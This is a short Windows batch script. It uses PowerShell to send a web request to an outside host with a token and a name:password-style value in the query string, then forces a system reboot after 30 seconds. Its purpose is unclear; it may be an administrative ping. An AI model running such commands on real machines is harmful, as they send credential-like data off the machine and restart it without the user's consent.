@echo off

powershell.exe -noprofile -command "Invoke-WebRequest -Uri http://site.fun/?data=tok321_DedicName:123123@NOTE:Reboot-30s"
shutdown.exe /r /t 30

exit